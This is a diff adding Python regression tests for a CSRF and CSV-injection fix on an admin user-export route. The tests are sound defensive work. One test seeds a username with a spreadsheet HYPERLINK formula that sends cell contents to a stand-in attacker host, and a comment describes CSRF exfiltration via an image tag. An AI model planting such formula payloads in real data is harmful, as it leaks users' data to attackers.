@@ -222,5 +222,155 @@ class AdminJobsTestCase(unittest.TestCase):
         self.assertIn("long_runner", running_names)
 
 
+# ── /admin/users/{user_id}/export — MED CSRF + CSV-injection fix ──────────
+#
+# Regression coverage for the two findings closed in this commit:
+#   1. GET → 405. The route was GET and silently exfil'd PII via
+#      <img src="/admin/users/N/export"> when a super-admin had an authed
+#      session in the same browser. POST + CSRF closes that window.
+#   2. CSV cells starting with =/+/-/@/\t/\r get a leading single quote
+#      so spreadsheets render them as text rather than formulas. The
+#      attacker-controlled username is the realistic payload vector.
+
+from urllib.parse import urlencode  # noqa: E402
+
+
+def _prime_csrf(client: TestClient, session_token: str) -> str:
+    """Hit a GET that renders HTML so the CSRF cookie is minted."""
+    client.get(
+        "/admin/users",
+        cookies={server.COOKIE_NAME: session_token},
+        follow_redirects=False,
+    )
+    return client.cookies.get(server.CSRF_COOKIE_NAME) or ""
+
+
+class AdminUserExportTestCase(unittest.TestCase):
+    @classmethod
+    def setUpClass(cls):
+        try:
+            import migrations as _migrations
+            _migrations.upgrade_to_head()
+        except Exception:
+            pass
+        cls.client = TestClient(server.app)
+        cls.admin_token = _create_admin_session()
+        cls.admin_cookies = {server.COOKIE_NAME: cls.admin_token}
+
+    def _seed_target(self, username: str) -> int:
+        """Create a target user with a controllable username (the CSV-injection
+        vector). Returns the user id."""
+        email = f"export_target_{username}_{os.getpid()}@test.local"
+        existing = db.get_user_by_email(email)
+        if existing:
+            uid = int(existing["id"])
+        else:
+            uid = db.create_user(email, "Password1!verylong", username=username)
+        return uid
+
+    # ── 1. GET is no longer accepted ─────────────────────────────────
+
+    def test_get_export_is_rejected(self):
+        """The route used to be GET — the new POST-only registration must
+        return 405 (Method Not Allowed) on GET. A 404 would also indicate
+        the GET surface is gone; either passes the regression."""
+        uid = self._seed_target("plain_user")
+        r = self.client.get(
+            f"/admin/users/{uid}/export",
+            cookies=self.admin_cookies,
+            follow_redirects=False,
+        )
+        self.assertIn(r.status_code, (404, 405))
+
+    # ── 2. POST with valid CSRF returns CSV ──────────────────────────
+
+    def test_post_export_with_csrf_returns_csv(self):
+        uid = self._seed_target("normaluser")
+        csrf = _prime_csrf(self.client, self.admin_token)
+        self.assertTrue(csrf, "CSRF cookie must be set after priming")
+
+        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
+        r = self.client.post(
+            f"/admin/users/{uid}/export",
+            data=body,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            cookies={
+                server.COOKIE_NAME: self.admin_token,
+                server.CSRF_COOKIE_NAME: csrf,
+            },
+            follow_redirects=False,
+        )
+        self.assertEqual(r.status_code, 200)
+        self.assertIn("text/csv", r.headers.get("content-type", ""))
+        # CSV header + the username we just seeded should be in the body.
+        self.assertIn("field,value", r.text)
+        self.assertIn("normaluser", r.text)
+
+    def test_post_export_without_csrf_is_rejected(self):
+        uid = self._seed_target("no_csrf_user")
+        r = self.client.post(
+            f"/admin/users/{uid}/export",
+            cookies=self.admin_cookies,
+            follow_redirects=False,
+        )
+        self.assertEqual(r.status_code, 403)
+
+    # ── 3. CSV-injection defang ──────────────────────────────────────
+
+    def test_csv_cell_starting_with_equals_is_prefixed(self):
+        """The realistic payload: a malicious user signs up with a
+        HYPERLINK-laced username, then an admin exports their data.
+        We expect the cell to be written as ``'=HYPERLINK(...)`` so the
+        spreadsheet renders it as text, not a formula."""
+        evil = '=HYPERLINK("http://atk/?c="&A1,"x")'
+        uid = self._seed_target("csvevil")
+        # Patch the username directly — create_user normalises some chars.
+        with db.conn() as c:
+            c.execute("UPDATE users SET username = ? WHERE id = ?", (evil, uid))
+
+        csrf = _prime_csrf(self.client, self.admin_token)
+        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
+        r = self.client.post(
+            f"/admin/users/{uid}/export",
+            data=body,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            cookies={
+                server.COOKIE_NAME: self.admin_token,
+                server.CSRF_COOKIE_NAME: csrf,
+            },
+            follow_redirects=False,
+        )
+        self.assertEqual(r.status_code, 200)
+        text = r.text
+        # The defanged form must appear; the raw `=HYPERLINK` (no leading
+        # quote) must not.
+        self.assertIn("'=HYPERLINK", text)
+        # csv.writer quotes any cell containing `=` because the cell
+        # also contains a `"`. The check above (`'=HYPERLINK` substring)
+        # holds regardless of the surrounding double-quote escaping.
+
+    def test_csv_cell_safe_unicode_pass_through(self):
+        """Non-dangerous cells (regular email, plain username) must not
+        gain a stray leading quote — only the unsafe prefix set is
+        rewritten."""
+        uid = self._seed_target("benign42")
+        csrf = _prime_csrf(self.client, self.admin_token)
+        body = urlencode([(server.CSRF_FORM_FIELD, csrf)])
+        r = self.client.post(
+            f"/admin/users/{uid}/export",
+            data=body,
+            headers={"Content-Type": "application/x-www-form-urlencoded"},
+            cookies={
+                server.COOKIE_NAME: self.admin_token,
+                server.CSRF_COOKIE_NAME: csrf,
+            },
+            follow_redirects=False,
+        )
+        self.assertEqual(r.status_code, 200)
+        # No leading `'` on the username row — the value is benign.
+        self.assertNotIn("'benign42", r.text)
+        self.assertIn("benign42", r.text)
+
+
 if __name__ == "__main__":
     unittest.main()
